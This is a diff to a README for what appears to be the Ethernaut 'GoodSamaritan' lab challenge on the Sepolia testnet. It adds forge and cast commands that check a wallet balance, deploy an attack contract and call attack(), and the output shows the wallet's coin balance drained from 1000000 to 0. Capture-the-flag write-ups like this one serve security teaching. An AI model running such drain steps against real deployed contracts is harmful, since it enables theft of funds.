@@ -18,20 +18,40 @@ Things that might help:
 
 ## Attack
 
-1. Deploy `GoodSamaritanAttack` and the attack will be executed.
+1. Check initial balance.
+
+```bash
+# Coin address contract: 0x04BE262c1f2D1b2EFd7eBaaAeD584b8222661916
+# initial wallet: 0x2579F0110118287298aE5428539FEe6Db5C55068
+
+cast call 0x04BE262c1f2D1b2EFd7eBaaAeD584b8222661916 "balances(address)(uint256)" 0x2579F0110118287298aE5428539FEe6Db5C55068 --rpc-url $ALCHEMY_RPC_URL --legacy
+# 1000000 [1e6]
+```
+
+2. Deploy `GoodSamaritanAttack` and the attack will be executed.
 
 ```bash
 forge script script/DeployGoodSamaritanAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy
 
 # make deploy ARGS="--network sepolia"
-# https://sepolia.etherscan.io/address/0x8D9D91659B8661C1d8Fd9b4417385F2DF82f4D5C
+# https://sepolia.etherscan.io/address/0x6147bE8Dba9D155875CF4cf9F771212Ef2be6aF5
 ```
 
-2. Attack
+3. Attack
 
 ```bash
 cast send $CONTRACT_ADDRESS "attack()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
-# https://sepolia.etherscan.io/tx/0x46afd9f2f403a22e36d4148374eedcf08de11ce358794c5839e0e23a3cb088a0
+# https://sepolia.etherscan.io/tx/0x3e47361ae94bbb4ad798347a9d5b88b27913086c787746b390e9ae800aa366bb
+```
+
+4. Check balance after attack.
+
+```bash
+# Coin address contract: 0x04BE262c1f2D1b2EFd7eBaaAeD584b8222661916
+# initial wallet: 0x2579F0110118287298aE5428539FEe6Db5C55068
+
+cast call 0x04BE262c1f2D1b2EFd7eBaaAeD584b8222661916 "balances(address)(uint256)" 0x2579F0110118287298aE5428539FEe6Db5C55068 --rpc-url $ALCHEMY_RPC_URL --legacy
+# 0
 ```
 
 ## Fix
